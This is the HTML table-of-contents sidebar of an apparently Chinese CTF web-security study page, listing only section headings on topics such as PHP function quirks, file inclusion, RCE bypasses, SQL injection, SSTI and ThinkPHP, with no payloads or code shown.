nav-level-4"><a class="nav-link" href="#PHP%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="nav-number">2.0.1.6.</span> <span class="nav-text">PHP短标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#substr%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.7.</span> <span class="nav-text">substr函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#intval%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.8.</span> <span class="nav-text">intval函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mt-srand%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.9.</span> <span class="nav-text">mt_srand函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.0.1.9.1.</span> <span class="nav-text">伪随机数漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hexdec%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.10.</span> <span class="nav-text">hexdec函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-url%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.11.</span> <span class="nav-text">parse_url函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SERVER-%E2%80%98REQUEST-URI%E2%80%99"><span class="nav-number">2.0.1.12.</span> <span class="nav-text">$_SERVER[‘REQUEST_URI’]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-function%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.13.</span> <span class="nav-text">create_function函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#foreach%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.14.</span> <span class="nav-text">foreach函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mb-substr-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.15.</span> <span class="nav-text">mb_substr()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mb-strpos-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.16.</span> <span class="nav-text">mb_strpos()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#in-array-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.17.</span> <span class="nav-text">in_array()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strstr-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.18.</span> <span class="nav-text">strstr()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#str-ireplace-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.19.</span> <span class="nav-text">str_ireplace()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB"><span class="nav-number">2.0.1.20.</span> <span class="nav-text">类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#javascript"><span class="nav-number">2.0.2.</span> <span class="nav-text">javascript</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#btoa-amp-atob"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">btoa()&amp;atob()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F"><span class="nav-number">2.0.3.</span> <span class="nav-text">编码方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B2%E5%87%BB%E7%A0%81-Tap-code"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">敲击码(Tap code)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E7%AD%89%E6%95%88%E5%80%BC%E7%BB%95%E8%BF%87"><span class="nav-number">2.0.4.</span> <span class="nav-text">md5等效值绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SHA1%E7%A2%B0%E6%92%9E"><span class="nav-number">2.0.5.</span> <span class="nav-text">SHA1碰撞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95waf"><span class="nav-number">2.0.6.</span> <span class="nav-text">绕waf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6"><span class="nav-number">2.0.6.1.</span> <span class="nav-text">限制长度</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%80%83%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">考点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.</span> <span class="nav-text">数据泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kali%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.1.</span> <span class="nav-text">Kali扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GitHack"><span class="nav-number">3.1.2.</span> <span class="nav-text">GitHack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.3.</span> <span class="nav-text">版本控制泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robots%E5%90%8E%E5%8F%B0%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.4.</span> <span class="nav-text">robots后台泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phps%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.5.</span> <span class="nav-text">phps源码泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.6.</span> <span class="nav-text">源码压缩包泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vim%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.7.</span> <span class="nav-text">vim临时文件泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%90%8Dtxt%E8%AE%B0%E5%BD%95%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.8.</span> <span class="nav-text">域名txt记录泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%85%AC%E5%B8%83"><span class="nav-number">3.1.9.</span> <span class="nav-text">敏感信息公布</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML"><span class="nav-number">3.1.10.</span> <span class="nav-text">HTML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFjs%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.1.11.</span> <span class="nav-text">前端js信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E5%89%8D%E7%AB%AF%E5%BA%94%E7%94%A8"><span class="nav-number">3.1.12.</span> <span class="nav-text">web前端应用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.</span> <span class="nav-text">爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BurpSuite%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.1.</span> <span class="nav-text">BurpSuite爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.2.</span> <span class="nav-text">域名爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.3.</span> <span class="nav-text">条件爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.4.</span> <span class="nav-text">随机数种子爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.5.</span> <span class="nav-text">伪随机数爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E8%AF%B7%E6%B1%82"><span class="nav-number">3.3.</span> <span class="nav-text">http请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">3.4.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">前置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">PHP相关函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.4.1.2.</span> <span class="nav-text">php伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">3.4.1.3.</span> <span class="nav-text">Apache日志文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89"><span class="nav-number">3.4.2.</span> <span class="nav-text">本地文件包含漏洞（LFI）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">Apache日志包含漏洞+目录穿越</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%AA%E6%96%AD%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.2.2.</span> <span class="nav-text">截断攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88RFI%EF%BC%89"><span class="nav-number">3.4.3.</span> <span class="nav-text">远程文件包含漏洞（RFI）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6include"><span class="nav-number">3.4.4.</span> <span class="nav-text">日志文件include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">3.4.5.</span> <span class="nav-text">Session文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#session%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">3.4.5.1.</span> <span class="nav-text">session工作原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">3.4.5.2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.4.5.3.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.4.5.4.</span> <span class="nav-text">条件竞争</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">3.4.6.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload"><span class="nav-number">3.5.</span> <span class="nav-text">文件上传upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">3.6.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E6%8C%87%E4%BB%A4"><span class="nav-number">3.6.1.</span> <span class="nav-text">Linux指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-number">3.6.2.</span> <span class="nav-text">系统命令执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="nav-number">3.6.3.</span> <span class="nav-text">绕过被过滤的字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.7.</span> <span class="nav-text">编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64"><span class="nav-number">3.7.1.</span> <span class="nav-text">base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex"><span class="nav-number">3.7.2.</span> <span class="nav-text">hex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oct-x2F-%E5%AD%97%E8%8A%82"><span class="nav-number">3.7.3.</span> <span class="nav-text">oct&#x2F;字节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">3.7.4.</span> <span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">3.7.5.</span> <span class="nav-text">单引号双引号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="nav-number">3.7.6.</span> <span class="nav-text">反斜杠绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Drce"><span class="nav-number">3.7.7.</span> <span class="nav-text">无字母rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="nav-number">3.7.8.</span> <span class="nav-text">无回显rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.8.</span> <span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.1.</span> <span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP%E9%93%BE"><span class="nav-number">3.8.2.</span> <span class="nav-text">POP链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">3.9.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="nav-number">3.9.1.</span> <span class="nav-text">SQL语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.9.2.</span> <span class="nav-text">万能密码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="nav-number">3.9.3.</span> <span class="nav-text">位数长度不足</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2"><span class="nav-number">3.9.4.</span> <span class="nav-text">过滤替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">3.9.5.</span> <span class="nav-text">注入位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="nav-number">3.9.6.</span> <span class="nav-text">注入手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">3.9.7.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.9.8.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">3.9.9.</span> <span class="nav-text">堆叠注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">3.10.</span> <span class="nav-text">SSTI（服务器端模板注入）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%ADSSTI%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.10.1.</span> <span class="nav-text">判断SSTI类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB-1"><span class="nav-number">3.10.2.</span> <span class="nav-text">类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty"><span class="nav-number">3.10.3.</span> <span class="nav-text">Smarty</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">模板漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP"><span class="nav-number">4.1.</span> <span class="nav-text">ThinkPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-0-x"><span class="nav-number">4.1.1.</span> <span class="nav-text">5.0.x</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
